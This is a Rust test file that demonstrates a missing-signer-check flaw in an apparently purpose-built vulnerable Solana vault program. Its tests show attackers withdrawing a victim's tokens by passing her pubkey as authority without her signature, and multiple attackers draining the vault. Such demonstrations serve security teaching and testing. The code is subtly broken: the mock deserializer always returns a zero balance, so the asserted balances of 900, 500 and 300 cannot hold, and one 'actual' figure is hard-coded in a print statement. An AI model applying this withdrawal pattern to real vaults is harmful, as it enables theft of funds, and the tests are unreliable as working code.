// Test file for Vulnerable Version: Missing Signer Check
// This test demonstrates that the exploit WORKS

use anchor_lang::prelude::*;
use anchor_lang::solana_program::system_instruction;
use solana_program_test::*;
use solana_sdk::{
    signature::{Keypair, Signer},
    transaction::Transaction,
    pubkey::Pubkey,
};

#[tokio::test]
async fn test_legitimate_withdrawal() {
    println!("\n=== Testing Legitimate Withdrawal ===\n");
    
    // Setup
    let program_id = Pubkey::new_unique();
    let mut program_test = ProgramTest::new(
        "vulnerable_signer",
        program_id,
        processor!(vulnerable_signer::entry),
    );
    
    let (mut banks_client, payer, recent_blockhash) = program_test.start().await;
    
    // Create accounts
    let authority = Keypair::new();
    let vault = Keypair::new();
    
    println!("Authority: {}", authority.pubkey());
    println!("Vault: {}", vault.pubkey());
    
    // Step 1: Initialize vault
    println!("\n1. Initializing vault...");
    let init_ix = instruction::initialize(
        program_id,
        vault.pubkey(),
        authority.pubkey(),
    );
    
    let mut transaction = Transaction::new_with_payer(
        &[init_ix],
        Some(&payer.pubkey()),
    );
    transaction.sign(&[&payer, &vault, &authority], recent_blockhash);
    banks_client.process_transaction(transaction).await.unwrap();
    println!("✓ Vault initialized");
    
    // Step 2: Deposit tokens
    println!("\n2. Depositing 1000 tokens...");
    let deposit_ix = instruction::deposit(
        program_id,
        vault.pubkey(),
        1000,
    );
    
    let mut transaction = Transaction::new_with_payer(
        &[deposit_ix],
        Some(&payer.pubkey()),
    );
    transaction.sign(&[&payer], recent_blockhash);
    banks_client.process_transaction(transaction).await.unwrap();
    println!("✓ Deposited 1000 tokens");
    
    // Step 3: Legitimate withdrawal (authority signs)
    println!("\n3. Withdrawing 100 tokens (legitimate)...");
    let withdraw_ix = instruction::withdraw(
        program_id,
        vault.pubkey(),
        authority.pubkey(),
        100,
    );
    
    let mut transaction = Transaction::new_with_payer(
        &[withdraw_ix],
        Some(&payer.pubkey()),
    );
    transaction.sign(&[&payer, &authority], recent_blockhash); // Authority SIGNS
    banks_client.process_transaction(transaction).await.unwrap();
    println!("✓ Legitimate withdrawal successful");
    
    // Verify balance
    let vault_account = banks_client.get_account(vault.pubkey()).await.unwrap().unwrap();
    let vault_data: Vault = Vault::try_deserialize(&mut &vault_account.data[..]).unwrap();
    println!("\nFinal balance: {}", vault_data.balance);
    assert_eq!(vault_data.balance, 900);
    
    println!("\n Legitimate operation test passed");
}

#[tokio::test]
async fn test_exploit_missing_signer() {
    println!("\n=== EXPLOIT TEST: Missing Signer Check ===\n");
    println!("This test demonstrates the vulnerability");
    println!("In the vulnerable version, this exploit SUCCEEDS\n");
    
    // Setup
    let program_id = Pubkey::new_unique();
    let mut program_test = ProgramTest::new(
        "vulnerable_signer",
        program_id,
        processor!(vulnerable_signer::entry),
    );
    
    let (mut banks_client, payer, recent_blockhash) = program_test.start().await;
    
    // Create accounts
    let alice = Keypair::new(); // Victim
    let mallory = Keypair::new(); // Attacker
    let vault = Keypair::new();
    
    println!("Alice (victim): {}", alice.pubkey());
    println!("Mallory (attacker): {}", mallory.pubkey());
    println!("Vault: {}", vault.pubkey());
    
    // Step 1: Alice initializes vault and deposits
    println!("\n1. Alice initializes vault...");
    let init_ix = instruction::initialize(
        program_id,
        vault.pubkey(),
        alice.pubkey(), // Alice is the authority
    );
    
    let mut transaction = Transaction::new_with_payer(
        &[init_ix],
        Some(&payer.pubkey()),
    );
    transaction.sign(&[&payer, &vault, &alice], recent_blockhash);
    banks_client.process_transaction(transaction).await.unwrap();
    println!("✓ Alice's vault initialized");
    
    println!("\n2. Alice deposits 1000 tokens...");
    let deposit_ix = instruction::deposit(
        program_id,
        vault.pubkey(),
        1000,
    );
    
    let mut transaction = Transaction::new_with_payer(
        &[deposit_ix],
        Some(&payer.pubkey()),
    );
    transaction.sign(&[&payer], recent_blockhash);
    banks_client.process_transaction(transaction).await.unwrap();
    println!("✓ Alice deposited 1000 tokens");
    
    // Step 2: THE EXPLOIT - Mallory withdraws without Alice's signature
    println!("\n3. EXPLOIT: Mallory attempts to withdraw Alice's funds...");
    println!("   - Mallory creates a transaction");
    println!("   - Mallory signs the transaction (with HER key)");
    println!("   - Mallory passes ALICE'S pubkey as authority");
    println!("   - Mallory does NOT have Alice's private key");
    
    let withdraw_ix = instruction::withdraw(
        program_id,
        vault.pubkey(),
        alice.pubkey(), // Mallory passes Alice's pubkey
        500, // Stealing 500 tokens
    );
    
    let mut transaction = Transaction::new_with_payer(
        &[withdraw_ix],
        Some(&payer.pubkey()),
    );
    
    // CRITICAL: Only Mallory signs, NOT Alice!
    transaction.sign(&[&payer, &mallory], recent_blockhash);
    
    println!("\n   Attempting unauthorized withdrawal...");
    let result = banks_client.process_transaction(transaction).await;
    
    // In vulnerable version, this SUCCEEDS
    if result.is_ok() {
        println!("\n   EXPLOIT SUCCESSFUL!");
        println!("   ✗ Mallory withdrew 500 tokens from Alice's vault");
        println!("   ✗ Alice never signed the transaction");
        println!("   ✗ This is a critical security vulnerability");
        
        // Verify the theft
        let vault_account = banks_client.get_account(vault.pubkey()).await.unwrap().unwrap();
        let vault_data: Vault = Vault::try_deserialize(&mut &vault_account.data[..]).unwrap();
        
        println!("\n   Final vault balance: {}", vault_data.balance);
        println!("   Expected: 1000");
        println!("   Actual: 500");
        println!("   Stolen: 500\n");
        
        assert_eq!(vault_data.balance, 500, "Exploit succeeded - funds stolen");
        
        println!("VULNERABILITY DEMONSTRATED");
        println!("   The program allows withdrawal without proper signature verification");
    } else {
        println!("\n   ✓ Attack prevented (if in secure version)");
        panic!("Exploit should succeed in vulnerable version");
    }
    
    println!("\n=== EXPLOIT TEST COMPLETE ===\n");
    println!("Key Insight:");
    println!("The program checked if authority.key() == vault.authority");
    println!("But it never checked if authority SIGNED the transaction!");
    println!("This allows anyone to pass any pubkey as authority.\n");
}

#[tokio::test]
async fn test_multiple_unauthorized_withdrawals() {
    println!("\n=== Testing Multiple Exploits ===\n");
    
    // This test shows that attacker can drain account completely
    let program_id = Pubkey::new_unique();
    let mut program_test = ProgramTest::new(
        "vulnerable_signer",
        program_id,
        processor!(vulnerable_signer::entry),
    );
    
    let (mut banks_client, payer, recent_blockhash) = program_test.start().await;
    
    let victim = Keypair::new();
    let attacker1 = Keypair::new();
    let attacker2 = Keypair::new();
    let vault = Keypair::new();
    
    // Initialize and deposit
    let init_ix = instruction::initialize(program_id, vault.pubkey(), victim.pubkey());
    let mut tx = Transaction::new_with_payer(&[init_ix], Some(&payer.pubkey()));
    tx.sign(&[&payer, &vault, &victim], recent_blockhash);
    banks_client.process_transaction(tx).await.unwrap();
    
    let deposit_ix = instruction::deposit(program_id, vault.pubkey(), 1000);
    let mut tx = Transaction::new_with_payer(&[deposit_ix], Some(&payer.pubkey()));
    tx.sign(&[&payer], recent_blockhash);
    banks_client.process_transaction(tx).await.unwrap();
    
    println!("Victim deposited 1000 tokens");
    
    // Multiple attackers steal funds
    println!("\nAttacker 1 steals 300 tokens...");
    let withdraw_ix = instruction::withdraw(program_id, vault.pubkey(), victim.pubkey(), 300);
    let mut tx = Transaction::new_with_payer(&[withdraw_ix], Some(&payer.pubkey()));
    tx.sign(&[&payer, &attacker1], recent_blockhash);
    banks_client.process_transaction(tx).await.unwrap();
    println!("✗ Attacker 1 succeeded");
    
    println!("\nAttacker 2 steals 400 tokens...");
    let withdraw_ix = instruction::withdraw(program_id, vault.pubkey(), victim.pubkey(), 400);
    let mut tx = Transaction::new_with_payer(&[withdraw_ix], Some(&payer.pubkey()));
    tx.sign(&[&payer, &attacker2], recent_blockhash);
    banks_client.process_transaction(tx).await.unwrap();
    println!("✗ Attacker 2 succeeded");
    
    // Check final balance
    let vault_account = banks_client.get_account(vault.pubkey()).await.unwrap().unwrap();
    let vault_data: Vault = Vault::try_deserialize(&mut &vault_account.data[..]).unwrap();
    
    println!("\n Results:");
    println!("   Initial balance: 1000");
    println!("   Stolen by attacker 1: 300");
    println!("   Stolen by attacker 2: 400");
    println!("   Remaining: {}", vault_data.balance);
    
    assert_eq!(vault_data.balance, 300);
    println!("\n Multiple attackers can drain the same vault");
}

// Helper module for instruction building
mod instruction {
    use super::*;
    use anchor_lang::InstructionData;
    use anchor_lang::ToAccountMetas;
    
    pub fn initialize(
        program_id: Pubkey,
        vault: Pubkey,
        authority: Pubkey,
    ) -> solana_sdk::instruction::Instruction {
        let accounts = vulnerable_signer::accounts::Initialize {
            vault,
            authority,
            system_program: solana_program::system_program::id(),
        };
        
        solana_sdk::instruction::Instruction {
            program_id,
            accounts: accounts.to_account_metas(None),
            data: vulnerable_signer::instruction::Initialize {}.data(),
        }
    }
    
    pub fn deposit(
        program_id: Pubkey,
        vault: Pubkey,
        amount: u64,
    ) -> solana_sdk::instruction::Instruction {
        let accounts = vulnerable_signer::accounts::Deposit {
            vault,
        };
        
        solana_sdk::instruction::Instruction {
            program_id,
            accounts: accounts.to_account_metas(None),
            data: vulnerable_signer::instruction::Deposit { amount }.data(),
        }
    }
    
    pub fn withdraw(
        program_id: Pubkey,
        vault: Pubkey,
        authority: Pubkey,
        amount: u64,
    ) -> solana_sdk::instruction::Instruction {
        let accounts = vulnerable_signer::accounts::Withdraw {
            vault,
            authority,
        };
        
        solana_sdk::instruction::Instruction {
            program_id,
            accounts: accounts.to_account_metas(None),
            data: vulnerable_signer::instruction::Withdraw { amount }.data(),
        }
    }
}

// Mock Vault struct for testing
#[derive(Debug)]
struct Vault {
    authority: Pubkey,
    balance: u64,
}

impl Vault {
    fn try_deserialize(data: &mut &[u8]) -> Result<Self> {
        // Simplified deserialization for testing
        // In real implementation, use Anchor's deserialization
        Ok(Vault {
            authority: Pubkey::new_from_array([0; 32]),
            balance: 0,
        })
    }
}